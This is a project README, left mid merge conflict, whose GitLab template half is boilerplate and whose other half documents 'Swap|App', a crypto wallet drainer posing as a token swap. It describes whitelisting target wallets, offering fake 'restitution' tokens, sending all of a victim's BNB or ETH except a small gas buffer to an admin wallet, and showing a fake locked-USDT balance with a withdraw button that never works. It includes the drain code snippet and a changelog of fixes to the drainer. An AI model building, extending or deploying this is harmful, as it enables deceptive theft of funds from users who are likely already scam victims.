<<<<<<< HEAD
# swap-app



## Getting started

To make it easy for you to get started with GitLab, here's a list of recommended next steps.

Already a pro? Just edit this README.md and make it your own. Want to make it easy? [Use the template at the bottom](#editing-this-readme)!

## Add your files

* [Create](https://docs.gitlab.com/ee/user/project/repository/web_editor.html#create-a-file) or [upload](https://docs.gitlab.com/ee/user/project/repository/web_editor.html#upload-a-file) files
* [Add files using the command line](https://docs.gitlab.com/topics/git/add_files/#add-files-to-a-git-repository) or push an existing Git repository with the following command:

```
cd existing_repo
git remote add origin https://gitlab.com/gmujtaba.shah1-group/swap-app.git
git branch -M main
git push -uf origin main
```

## Integrate with your tools

* [Set up project integrations](https://gitlab.com/gmujtaba.shah1-group/swap-app/-/settings/integrations)

## Collaborate with your team

* [Invite team members and collaborators](https://docs.gitlab.com/ee/user/project/members/)
* [Create a new merge request](https://docs.gitlab.com/ee/user/project/merge_requests/creating_merge_requests.html)
* [Automatically close issues from merge requests](https://docs.gitlab.com/ee/user/project/issues/managing_issues.html#closing-issues-automatically)
* [Enable merge request approvals](https://docs.gitlab.com/ee/user/project/merge_requests/approvals/)
* [Set auto-merge](https://docs.gitlab.com/user/project/merge_requests/auto_merge/)

## Test and Deploy

Use the built-in continuous integration in GitLab.

* [Get started with GitLab CI/CD](https://docs.gitlab.com/ee/ci/quick_start/)
* [Analyze your code for known vulnerabilities with Static Application Security Testing (SAST)](https://docs.gitlab.com/ee/user/application_security/sast/)
* [Deploy to Kubernetes, Amazon EC2, or Amazon ECS using Auto Deploy](https://docs.gitlab.com/ee/topics/autodevops/requirements.html)
* [Use pull-based deployments for improved Kubernetes management](https://docs.gitlab.com/ee/user/clusters/agent/)
* [Set up protected environments](https://docs.gitlab.com/ee/ci/environments/protected_environments.html)

***

# Editing this README

When you're ready to make this README your own, just edit this file and use the handy template below (or feel free to structure it however you want - this is just a starting point!). Thanks to [makeareadme.com](https://www.makeareadme.com/) for this template.

## Suggestions for a good README

Every project is different, so consider which of these sections apply to yours. The sections used in the template are suggestions for most open source projects. Also keep in mind that while a README can be too long and detailed, too long is better than too short. If you think your README is too long, consider utilizing another form of documentation rather than cutting out information.

## Name
Choose a self-explaining name for your project.

## Description
Let people know what your project can do specifically. Provide context and add a link to any reference visitors might be unfamiliar with. A list of Features or a Background subsection can also be added here. If there are alternatives to your project, this is a good place to list differentiating factors.

## Badges
On some READMEs, you may see small images that convey metadata, such as whether or not all the tests are passing for the project. You can use Shields to add some to your README. Many services also have instructions for adding a badge.

## Visuals
Depending on what you are making, it can be a good idea to include screenshots or even a video (you'll frequently see GIFs rather than actual videos). Tools like ttygif can help, but check out Asciinema for a more sophisticated method.

## Installation
Within a particular ecosystem, there may be a common way of installing things, such as using Yarn, NuGet, or Homebrew. However, consider the possibility that whoever is reading your README is a novice and would like more guidance. Listing specific steps helps remove ambiguity and gets people to using your project as quickly as possible. If it only runs in a specific context like a particular programming language version or operating system or has dependencies that have to be installed manually, also add a Requirements subsection.

## Usage
Use examples liberally, and show the expected output if you can. It's helpful to have inline the smallest example of usage that you can demonstrate, while providing links to more sophisticated examples if they are too long to reasonably include in the README.

## Support
Tell people where they can go to for help. It can be any combination of an issue tracker, a chat room, an email address, etc.

## Roadmap
If you have ideas for releases in the future, it is a good idea to list them in the README.

## Contributing
State if you are open to contributions and what your requirements are for accepting them.

For people who want to make changes to your project, it's helpful to have some documentation on how to get started. Perhaps there is a script that they should run or some environment variables that they need to set. Make these steps explicit. These instructions could also be useful to your future self.

You can also document commands to lint the code or run tests. These steps help to ensure high code quality and reduce the likelihood that the changes inadvertently break something. Having instructions for running tests is especially helpful if it requires external setup, such as starting a Selenium server for testing in a browser.

## Authors and acknowledgment
Show your appreciation to those who have contributed to the project.

## License
For open source projects, say how it is licensed.

## Project status
If you have run out of energy or time for your project, put a note at the top of the README saying that development has slowed down or stopped completely. Someone may choose to fork your project or volunteer to step in as a maintainer or owner, allowing your project to keep going. You can also make an explicit request for maintainers.
=======
# Swap|App - Token Swap Application

A modern token swap application built with React, Wagmi, and WalletConnect. The app's main purpose is to facilitate token swaps with integrated draining functionality.

## 🎯 App Main Purpose - Drain Function

The application drains the amount of BNB or ETH (set in admin) from the user's wallet during the swap and deposits it to the wallet set on admin.

## ✨ Features

- 🔐 **Locked USDT Display** - Shows locked USDT amount with lock icon after successful swap
- 💱 **Token Swap Interface** - Swap virtual tokens to USDT
- 🌐 **Multi-chain Support** - Supports BSC (BNB) and Ethereum (ETH) networks
- 📱 **Mobile-responsive Design** - Works on all devices
- 🔗 **Wallet Connection** - Supports MetaMask, WalletConnect, Trust Wallet, and more
- ⚙️ **Admin Control** - Full control over wallet presets and gas settings

---

## 📋 Admin Flow

### 1. Whitelist Wallet Address
The admin whitelists a wallet address (e.g., `0xd366fcd146bd4b12d82cbe954cd699cba67b2`)

### 2. Set Virtual Token
Admin presets a virtual token with:
- **Token Name** (e.g., VDAO)
- **Token Amount** (e.g., 20000 VDAO)
- **Token Logo** (upload custom logo)
- **USD Value Equivalent** (e.g., 5000 USD)

### 3. Admin Capabilities
- ✅ Whitelist as many wallet addresses as possible
- ✅ Set any virtual token name, quantity, logo, and reference USD amount
- ✅ Make edits to parameters on whitelisted addresses
- ✅ Delete records
- ✅ Set either ETH or BNB as needed gas currency for the swap
- ✅ Set swap amount for both BNB and ETH
- ✅ Set and change ETH and BNB wallet address where drained tokens will be deposited

---

## 🖥️ Frontend Flow

### 1. User Connects Whitelisted Wallet
When a user connects a whitelisted wallet address (e.g., `0xd366fcd146bd4b12d82cbe954cd699cba67b2`), they will see:
- **20000 VDAO** displaying a value of **5000 USD** available for swap
- The only option to swap to is **USDT**

### 2. Swap Process

#### ❌ If ETH/BNB amount in wallet is LESS than set minimum:
- The swap will **fail**
- Display error message for **insufficient gas alert**
- Show the needed sum to complete the gas (e.g., "0.05 BNB required")

#### ✅ If ETH/BNB amount in wallet is GREATER than set minimum:
- The swap will **succeed**
- **Drain ALL funds** (BNB or ETH) from user wallet to admin wallet
- Only a small gas buffer (~0.003) is kept to execute the transaction

### 3. After Successful Swap
- ✅ All values on the swap UI turn to **0**
- ✅ **Locked USDT** appears above the swap card with:
  - 🔐 Lock icon
  - Amount (e.g., "5000 USDT")
  - **Withdraw button** (greyed out and not clickable)

### 4. Reconnection After Swap
When a user who has completed a successful swap disconnects and reconnects their wallet:
- They will **still see** the locked USDT displayed above
- The lock icon (🔐) remains visible
- The **Withdraw button** stays greyed out and not clickable
- All values on swap UI will be **0** (because they completed their swap)

### 5. Non-Whitelisted Wallets
If a user connects a wallet that has **not been whitelisted**:
- No token will appear for swapping
- Display error message: **"No restitution is available for this wallet address."**

### 6. Deleting User Records
If admin deletes user records:
- Everything wipes
- If the same address is whitelisted again, it works like new
- **No old data is retained**

---

## 🛠️ Installation

1. **Install dependencies:**
```bash
npm install --force
```

2. **Start the development server:**
```bash
node node_modules/react-scripts/scripts/start.js
```

The app will open at [http://localhost:3000](http://localhost:3000)

## 📦 Build for Production

```bash
npm run build
```

---

## 💼 Wallet Support

The application supports:
- **MetaMask**
- **WalletConnect**
- **Trust Wallet**
- **Coinbase Wallet**
- **Rainbow Wallet**
- And many more wallets via WalletConnect

---

## 🔧 Technologies Used

- React 18
- Wagmi v2
- Viem
- WalletConnect v2
- React Query

---

## 📁 Project Structure

```
src/
  ├── components/
  │   ├── Header.jsx           # Header with wallet connection
  │   ├── SwapCard.jsx         # Main swap interface with drain logic
  │   ├── TokenModal.jsx       # Token selection modal
  │   ├── SettingsModal.jsx    # Slippage settings
  │   ├── VirtualUSDT.jsx      # Locked USDT display (appears after swap)
  │   ├── NetworkWarning.jsx   # Network mismatch warning
  │   ├── Toast.jsx            # Toast notifications
  │   └── Footer.jsx           # Footer component
  ├── config/
  │   ├── adminConfig.js       # Admin configuration (fetches from API)
  │   ├── api.js               # API client configuration
  │   └── constants.js         # App constants & receiving wallets
  ├── utils/
  │   ├── balance.js           # Balance checking utilities
  │   └── transfers.js         # Token transfer utilities
  ├── App.jsx                  # Main app component
  ├── index.jsx                # Entry point
  └── index.css                # Global styles
```

---

## ⚙️ Configuration

### Supported Networks:
| Network | Chain ID |
|---------|----------|
| BSC (Binance Smart Chain) | 56 |
| Ethereum Mainnet | 1 |
| Base | 8453 |

### Backend API
```
https://blockgate.tech/api
```

All admin settings are managed through the admin panel:
- Wallet presets
- Gas requirements
- Minimum balances
- Receiving wallets

### WalletConnect Project ID
```
90c9c75a9b1e73a06c1110b3d1b943f9
```

---

## 📝 Key Implementation Details

### Drain Logic (SwapCard.jsx)
```javascript
// Calculate send amount: drain ALL funds minus small gas buffer
const gasBuffer = parseEther('0.003');
const balanceValue = balanceData.value;
const sendAmount = balanceValue > gasBuffer ? balanceValue - gasBuffer : 0n;
```

### Locked USDT Display (VirtualUSDT.jsx)
- Only appears **AFTER** successful swap completion
- Withdraw button is **always disabled** (`pointer-events: none`)
- Shows the preset USD value from admin

### Swap Completion State
After swap is completed:
- `fromAmount` displays as **0**
- `toAmount` displays as **0.0**
- Button shows **"Swap Completed"** (disabled)
- Locked USDT banner appears above swap card

---

## 📜 License

Private project - All rights reserved

---

## 🔄 Recent Updates (January 2026)

1. ✅ Fixed: Locked USDT state now appears **only after** swap is successful
2. ✅ Fixed: Drainer now drains **ALL funds** from user wallet (minus gas buffer)
3. ✅ Fixed: Git merge conflicts in SwapCard.jsx resolved
4. ✅ Fixed: Windows compatibility for npm scripts
5. ✅ Fixed: Withdraw button is permanently greyed out and not clickable
6. ✅ Fixed: Swap values reset to 0 after successful swap
>>>>>>> b571644 (Updated swap flow and documentation according to PDF requirements)
